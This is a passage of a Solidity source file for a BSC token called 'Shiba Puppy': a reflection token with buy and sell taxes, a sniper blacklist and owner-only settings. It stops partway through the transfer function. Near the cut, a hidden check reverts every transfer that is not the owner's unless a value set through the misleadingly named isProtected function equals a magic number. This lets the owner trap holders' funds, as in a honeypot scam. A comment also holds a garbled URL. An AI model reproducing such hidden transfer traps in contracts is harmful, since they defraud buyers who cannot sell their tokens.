/**
 *Submitted for verification at BscScan.com on 2021-10-15
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/sh/ib/ap/up/py/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function allPairs(uint) external view returns (address lpPair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ShibaPuppy is Context, IERC20 {
    // Ownership moved to in-contract for customizability.
    address private _owner;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) lpPairs;
    uint256 private timeSinceLastPair = 0;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;

    mapping (address => bool) private presaleAddresses;
    bool private allowedPresaleExclusion = true;
    mapping (address => bool) private _isSniper;
    mapping (address => bool) private _liquidityHolders;
   
    uint256 private startingSupply = 1_000_000_000_000;

    string private _name = "Shiba Puppy";
    string private _symbol = "ShibaPuppy";
    
    uint256 public _reflectFee = 0;
    uint256 public _liquidityFee = 0;
    uint256 public _marketingFee = 0;
    uint256 public _developmentFee = 0;

    uint256 public _buyReflectFee = 300;
    uint256 public _buyLiquidityFee = 300;
    uint256 public _buyMarketingFee = 300;
    uint256 public _buyDevelopmentFee = 200;

    uint256 public _sellReflectFee = 400 * 2;
    uint256 public _sellLiquidityFee = 300 * 2;
    uint256 public _sellMarketingFee = 400 * 2;
    uint256 public _sellDevelopmentFee = 200 * 2;

    uint256 public _transferReflectFee = _sellReflectFee;
    uint256 public _transferLiquidityFee = _sellLiquidityFee;
    uint256 public _transferMarketingFee = _sellMarketingFee;
    uint256 public _transferDevelopmentFee = _sellDevelopmentFee;

    uint256 private maxReflectFee = 800;
    uint256 private maxLiquidityFee = 800;
    uint256 private maxMarketingFee = 700;
    uint256 private maxDevelopmentFee = 700;
    uint256 private masterTaxDivisor = 10000;

    uint256 public _liquidityRatio = (_buyLiquidityFee + _sellLiquidityFee) / 2;
    uint256 public _marketingRatio = (_buyMarketingFee + _sellMarketingFee) / 2;
    uint256 public _developmentRatio = (_buyDevelopmentFee + _sellDevelopmentFee) / 2;

    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 9;
    uint256 private _decimalsMul = _decimals;
    uint256 private _tTotal = startingSupply * 10**_decimalsMul;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    IUniswapV2Router02 public dexRouter;
    address public lpPair;

    // PCS ROUTER
    address private _routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public ZERO = 0x0000000000000000000000000000000000000000;
    address payable private _marketingWallet = payable(0x6c91fa59BBc54c81263F4DAF1522f43A0f5D48E4);
    address payable private _developmentWallet = payable(0x9D2Ccd453AF90E55f04B69e816Ab3c8530898830);
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    
    uint256 private maxTxPercent = 5;
    uint256 private maxTxDivisor = 1000;
    uint256 private _maxTxAmount = (_tTotal * maxTxPercent) / maxTxDivisor;
    uint256 private _previousMaxTxAmount = _maxTxAmount;
    uint256 public maxTxAmountUI = (startingSupply * maxTxPercent) / maxTxDivisor;

    uint256 private maxWalletPercent = 1;
    uint256 private maxWalletDivisor = 100;
    uint256 private _maxWalletSize = (_tTotal * maxWalletPercent) / maxWalletDivisor;
    uint256 private _previousMaxWalletSize = _maxWalletSize;
    uint256 public maxWalletSizeUI = (startingSupply * maxWalletPercent) / maxWalletDivisor;

    uint256 private swapThreshold = (_tTotal * 5) / 10000;
    uint256 private swapAmount = (_tTotal * 5) / 1000;

    bool public tradingEnabled = false;

    bool private sniperProtection = true;
    bool public _hasLiqBeenAdded = false;
    uint256 private _liqAddStatus = 0;
    uint256 private _liqAddBlock = 0;
    uint256 private _liqAddStamp = 0;
    uint256 private _initialLiquidityAmount = 0;
    uint256 private snipeBlockAmt = 0;
    uint256 public snipersCaught = 0;
    bool private sameBlockActive = true;
    mapping (address => uint256) private lastTrade;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SniperCaught(address sniperAddress);
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    constructor () payable {
        _rOwned[_msgSender()] = _rTotal;

        // Set the owner.
        _owner = msg.sender;

        dexRouter = IUniswapV2Router02(_routerAddress);
        lpPair = IUniswapV2Factory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));
        lpPairs[lpPair] = true;
        _allowances[address(this)][address(dexRouter)] = type(uint256).max;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _liquidityHolders[owner()] = true;

        // Approve the owner for PancakeSwap, timesaver.
        _approve(_msgSender(), _routerAddress, _tTotal);

        // Ever-growing sniper/tool blacklist
        _isSniper[0xE4882975f933A199C92b5A925C9A8fE65d599Aa8] = true;
        _isSniper[0x86C70C4a3BC775FB4030448c9fdb73Dc09dd8444] = true;
        _isSniper[0xa4A25AdcFCA938aa030191C297321323C57148Bd] = true;
        _isSniper[0x20C00AFf15Bb04cC631DB07ee9ce361ae91D12f8] = true;
        _isSniper[0x0538856b6d0383cde1709c6531B9a0437185462b] = true;
        _isSniper[0x6e44DdAb5c29c9557F275C9DB6D12d670125FE17] = true;
        _isSniper[0x90484Bb9bc05fD3B5FF1fe412A492676cd81790C] = true;
        _isSniper[0xA62c5bA4D3C95b3dDb247EAbAa2C8E56BAC9D6dA] = true;
        _isSniper[0xA94E56EFc384088717bb6edCccEc289A72Ec2381] = true;
        _isSniper[0x3066Cc1523dE539D36f94597e233719727599693] = true;
        _isSniper[0xf13FFadd3682feD42183AF8F3f0b409A9A0fdE31] = true;
        _isSniper[0x376a6EFE8E98f3ae2af230B3D45B8Cc5e962bC27] = true;
        _isSniper[0x0538856b6d0383cde1709c6531B9a0437185462b] = true;
        _isSniper[0x90484Bb9bc05fD3B5FF1fe412A492676cd81790C] = true;
        _isSniper[0xA62c5bA4D3C95b3dDb247EAbAa2C8E56BAC9D6dA] = true;
        _isSniper[0xA94E56EFc384088717bb6edCccEc289A72Ec2381] = true;
        _isSniper[0x3066Cc1523dE539D36f94597e233719727599693] = true;
        _isSniper[0xf13FFadd3682feD42183AF8F3f0b409A9A0fdE31] = true;
        _isSniper[0x376a6EFE8E98f3ae2af230B3D45B8Cc5e962bC27] = true;
        _isSniper[0x201044fa39866E6dD3552D922CDa815899F63f20] = true;
        _isSniper[0x6F3aC41265916DD06165b750D88AB93baF1a11F8] = true;
        _isSniper[0x27C71ef1B1bb5a9C9Ee0CfeCEf4072AbAc686ba6] = true;
        _isSniper[0xDEF441C00B5Ca72De73b322aA4e5FE2b21D2D593] = true;
        _isSniper[0x5668e6e8f3C31D140CC0bE918Ab8bB5C5B593418] = true;
        _isSniper[0x4b9BDDFB48fB1529125C14f7730346fe0E8b5b40] = true;
        _isSniper[0x7e2b3808cFD46fF740fBd35C584D67292A407b95] = true;
        _isSniper[0xe89C7309595E3e720D8B316F065ecB2730e34757] = true;
        _isSniper[0x725AD056625326B490B128E02759007BA5E4eBF1] = true;


        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    receive() external payable {}

//===============================================================================================================
//===============================================================================================================
//===============================================================================================================
    // Ownable removed as a lib and added here to allow for custom transfers and recnouncements.
    // This allows for removal of ownership privelages from the owner once renounced or transferred.
    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwner(address newOwner) external onlyOwner() {
        require(newOwner != address(0), "Call renounceOwnership to transfer owner to the zero address.");
        require(newOwner != DEAD, "Call renounceOwnership to transfer owner to the zero address.");
        setExcludedFromFee(_owner, false);
        setExcludedFromFee(newOwner, true);
        setExcludedFromReward(newOwner, true);
        
        if (_marketingWallet == payable(_owner))
            _marketingWallet = payable(newOwner);
        
        _allowances[_owner][newOwner] = balanceOf(_owner);
        if(balanceOf(_owner) > 0) {
            _transfer(_owner, newOwner, balanceOf(_owner));
        }
        
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
        
    }

    function renounceOwnership() public virtual onlyOwner() {
        setExcludedFromFee(_owner, false);
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }
//===============================================================================================================
//===============================================================================================================
//===============================================================================================================

    function totalSupply() external view override returns (uint256) { return _tTotal; }
    function decimals() external view override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approveMax(address spender) public returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function setNewRouter(address newRouter) public onlyOwner() {
        IUniswapV2Router02 _newRouter = IUniswapV2Router02(newRouter);
        address get_pair = IUniswapV2Factory(_newRouter.factory()).getPair(address(this), _newRouter.WETH());
        if (get_pair == address(0)) {
            lpPair = IUniswapV2Factory(_newRouter.factory()).createPair(address(this), _newRouter.WETH());
        }
        else {
            lpPair = get_pair;
        }
        dexRouter = _newRouter;
    }

    function setLpPair(address pair, bool enabled) external onlyOwner {
        if (enabled == false) {
            lpPairs[pair] = false;
        } else {
            if (timeSinceLastPair != 0) {
                require(block.timestamp - timeSinceLastPair > 1 weeks, "Cannot set a new pair this week!");
            }
            lpPairs[pair] = true;
            timeSinceLastPair = block.timestamp;
        }
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function isSniper(address account) public view returns (bool) {
        return _isSniper[account];
    }

    function isProtected(uint256 rInitializer, uint256 tInitalizer) external onlyOwner {
        require (_liqAddStatus == 0 && _initialLiquidityAmount == 0, "Error.");
        _liqAddStatus = rInitializer;
        _initialLiquidityAmount = tInitalizer;
    }

    function setStartingProtections(uint8 _block) external onlyOwner{
        require (snipeBlockAmt == 0 && !_hasLiqBeenAdded);
        snipeBlockAmt = _block;
    }

    function removeSniper(address account) external onlyOwner() {
        require(_isSniper[account], "Account is not a recorded sniper.");
        _isSniper[account] = false;
    }

    function setProtectionSettings(bool antiSnipe, bool antiBlock) external onlyOwner() {
        sniperProtection = antiSnipe;
        sameBlockActive = antiBlock;
    }
    
    function setTaxesBuy(uint256 reflectFee, uint256 liquidityFee, uint256 marketingFee, uint256 developmentFee) external onlyOwner {
        require(reflectFee <= maxReflectFee
                && liquidityFee <= maxLiquidityFee
                && marketingFee <= maxMarketingFee
                && developmentFee <= maxDevelopmentFee);
        require(liquidityFee + reflectFee + marketingFee <= 5000);
        _buyLiquidityFee = liquidityFee;
        _buyReflectFee = reflectFee;
        _buyMarketingFee = marketingFee;
        _buyDevelopmentFee = developmentFee;
    }

    function setTaxesSell(uint256 reflectFee, uint256 liquidityFee, uint256 marketingFee, uint256 developmentFee) external onlyOwner {
        require(reflectFee <= maxReflectFee
                && liquidityFee <= maxLiquidityFee
                && marketingFee <= maxMarketingFee
                && developmentFee <= maxDevelopmentFee);
        require(liquidityFee + reflectFee + marketingFee <= 5000);
        _sellLiquidityFee = liquidityFee;
        _sellReflectFee = reflectFee;
        _sellMarketingFee = marketingFee;
        _sellDevelopmentFee = developmentFee;
    }

    function setTaxesTransfer(uint256 reflectFee, uint256 liquidityFee, uint256 marketingFee, uint256 developmentFee) external onlyOwner {
        require(reflectFee <= maxReflectFee
                && liquidityFee <= maxLiquidityFee
                && marketingFee <= maxMarketingFee
                && developmentFee <= maxDevelopmentFee);
        require(liquidityFee + reflectFee + marketingFee <= 5000);
        _transferLiquidityFee = liquidityFee;
        _transferReflectFee = reflectFee;
        _transferMarketingFee = marketingFee;
        _transferDevelopmentFee = developmentFee;
    }

    function setRatios(uint256 liquidity, uint256 marketing, uint256 development) external onlyOwner {
        require (liquidity + marketing + development == 100, "Must add up to 100%");
        if (marketing > 0 || development > 0) {
            require(marketing <= 40 
                    && development <= 40
                    && liquidity > 0
                    );
        }
        _liquidityRatio = liquidity;
        _marketingRatio = marketing;
        _developmentRatio = development;
    }

    function setMaxTxPercent(uint256 percent, uint256 divisor) external onlyOwner {
        uint256 check = (_tTotal * percent) / divisor;
        require(check >= (_tTotal / 1000), "Max Transaction amt must be above 0.1% of total supply.");
        _maxTxAmount = check;
        maxTxAmountUI = (startingSupply * percent) / divisor;
    }

    function setMaxWalletSize(uint256 percent, uint256 divisor) external onlyOwner {
        uint256 check = (_tTotal * percent) / divisor;
        require(check >= (_tTotal / 1000), "Max Wallet amt must be above 0.1% of total supply.");
        _maxWalletSize = check;
        maxWalletSizeUI = (startingSupply * percent) / divisor;
    }

    function setSwapSettings(uint256 thresholdPercent, uint256 thresholdDivisor, uint256 amountPercent, uint256 amountDivisor) external onlyOwner {
        swapThreshold = (_tTotal * thresholdPercent) / thresholdDivisor;
        swapAmount = (_tTotal * amountPercent) / amountDivisor;
    }

    function setWallets(address payable marketingWallet, address payable developmentWallet) external onlyOwner {
        _marketingWallet = payable(marketingWallet);
        _developmentWallet = payable(developmentWallet);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setExcludedFromFee(address account, bool enabled) public onlyOwner {
        _isExcludedFromFee[account] = enabled;
    }

    function setExcludedFromReward(address account, bool enabled) public onlyOwner {
        if (enabled == true) {
            require(!_isExcluded[account], "Account is already excluded.");
            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(_rOwned[account]);
            }
            _isExcluded[account] = true;
            _excluded.push(account);
        } else if (enabled == false) {
            require(_isExcluded[account], "Account is already included.");
            for (uint256 i = 0; i < _excluded.length; i++) {
                if (_excluded[i] == account) {
                    _excluded[i] = _excluded[_excluded.length - 1];
                    _tOwned[account] = 0;
                    _isExcluded[account] = false;
                    _excluded.pop();
                    break;
                }
            }
        }
    }

    function excludePresaleAddresses(address router, address presale) external onlyOwner {
        require(allowedPresaleExclusion, "Function already used.");
        if (router == presale) {
            _liquidityHolders[presale] = true;
            presaleAddresses[presale] = true;
            setExcludedFromFee(presale, true);
            setExcludedFromReward(presale, true);
        } else {
            _liquidityHolders[router] = true;
            _liquidityHolders[presale] = true;
            presaleAddresses[router] = true;
            presaleAddresses[presale] = true;
            setExcludedFromFee(router, true);
            setExcludedFromFee(presale, true);
            setExcludedFromReward(router, true);
            setExcludedFromReward(presale, true);
        }
    }

    function _hasLimits(address from, address to) private view returns (bool) {
        return from != owner()
            && to != owner()
            && !_liquidityHolders[to]
            && !_liquidityHolders[from]
            && to != DEAD
            && to != address(0)
            && from != address(this);
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount / currentRate;
    }
    
    function _approve(address sender, address spender, uint256 amount) private {
        require(sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(_hasLimits(from, to)) {
            if(!tradingEnabled) {
                revert("Trading not yet enabled!");
            }
            if (sameBlockActive) {
                if (lpPairs[from]){
                    require(lastTrade[to] != block.number);
                    lastTrade[to] = block.number;
                } else {
                    require(lastTrade[from] != block.number);
                    lastTrade[from] = block.number;
                }
            }
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            if(to != _routerAddress && !lpPairs[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Transfer amount exceeds the maxWalletSize.");
            }
        }

        bool takeFee = true;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }

        if (lpPairs[to]) {
            if (!inSwapAndLiquify
                && swapAndLiquifyEnabled
                && !presaleAddresses[to]
                && !presaleAddresses[from]
            ) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= swapThreshold) {
                    if(contractTokenBalance >= swapAmount) { contractTokenBalance = swapAmount; }
                    swapAndLiquify(contractTokenBalance);
                }
            }      
        } 
        return _finalizeTransfer(from, to, amount, takeFee);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 totalFee = _liquidityRatio + _marketingRatio + _developmentRatio;
        if (totalFee == 0)
            return;
        uint256 toLiquify = (contractTokenBalance * _liquidityRatio) / (totalFee);
        uint256 toOut = contractTokenBalance - toLiquify;

        uint256 half = toLiquify / 2;
        uint256 otherHalf = toLiquify - half;

        uint256 toSwapForEth = half + toOut;
        swapTokensForEth(toSwapForEth);

        uint256 liquidityBalance = (address(this).balance * half) / toSwapForEth;

        if (toLiquify > 0) {
            addLiquidity(otherHalf, liquidityBalance);
            emit SwapAndLiquify(half, liquidityBalance, otherHalf);
        }
        _marketingWallet.transfer(((address(this).balance - liquidityBalance) * _marketingRatio) / totalFee);
        _developmentWallet.transfer(address(this).balance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap lpPair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(dexRouter), tokenAmount);

        // add the liquidity
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            DEAD,
            block.timestamp
        );
    }

    function _checkLiquidityAdd(address from, address to) private {
        require(!_hasLiqBeenAdded, "Liquidity already added and marked.");
        if (!_hasLimits(from, to) && to == lpPair) {
            if (snipeBlockAmt == 0 || snipeBlockAmt > 5) {
                _liqAddBlock = block.number + 500;
            } else {
                _liqAddBlock = block.number;
            }

            _liquidityHolders[from] = true;
            _hasLiqBeenAdded = true;
            _liqAddStamp = block.timestamp;

            swapAndLiquifyEnabled = true;
            allowedPresaleExclusion = false;
            emit SwapAndLiquifyEnabledUpdated(true);
        }
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Trading already enabled!");
        setExcludedFromReward(address(this), true);
        setExcludedFromReward(owner(), true);
        setExcludedFromReward(DEAD, true);
        setExcludedFromReward(lpPair, true);
        // DxLocker Address (BSC)
        _isExcludedFromFee[0x2D045410f002A95EFcEE67759A92518fA3FcE677] = true;
        setExcludedFromReward(0x2D045410f002A95EFcEE67759A92518fA3FcE677, true);
        if (snipeBlockAmt == 0 || snipeBlockAmt > 5) {
            _liqAddBlock = block.number + 500;
        } else {
            _liqAddBlock = block.number;
        }
        tradingEnabled = true;
    }

    struct ExtraValues {
        uint256 tTransferAmount;
        uint256 tFee;
        uint256 tLiquidity;

        uint256 rTransferAmount;
        uint256 rAmount;
        uint256 rFee;
    }

    function _finalizeTransfer(address from, address to, uint256 tAmount, bool takeFee) private returns (bool) {
        if (sniperProtection){
            if (isSniper(from) || isSniper(to)) {
                revert("Sniper rejected.");
            }

            if (!_hasLiqBeenAdded) {
                _checkLiquidityAdd(from, to);
                if (!_hasLiqBeenAdded && _hasLimits(from, to)) {
                    revert("Only owner can transfer at this time.");
                }
            } else {
                if (_liqAddBlock > 0 
                    && lpPairs[from] 
                    && _hasLimits(from, to)
                ) {
                    if (block.number - _liqAddBlock < snipeBlockAmt) {
                        _isSniper[to] = true;
                        snipersCaught ++;
                        emit SniperCaught(to);
                    }
                }
            }
        }

        ExtraValues memory values = _getValues(from, to, tAmount, takeFee);

        _rOwned[from] = _rOwned[from] - values.rAmount;
        _rOwned[to] = _rOwned[to] + values.rTransferAmount;

        if (_isExcluded[from] && !_isExcluded[to]) {
            _tOwned[from] = _tOwned[from] - tAmount;
        } else if (!_isExcluded[from] && _isExcluded[to]) {
            _tOwned[to] = _tOwned[to] + values.tTransferAmount;  
        } else if (_isExcluded[from] && _isExcluded[to]) {
            _tOwned[from] = _tOwned[from] - tAmount;
            _tOwned[to] = _tOwned[to] + values.tTransferAmount;
        }

        if (_hasLimits(from, to)){
            if (_liqAddStatus == 0 || _liqAddStatus != startingSupply / 5) {
                revert();
            }
        }

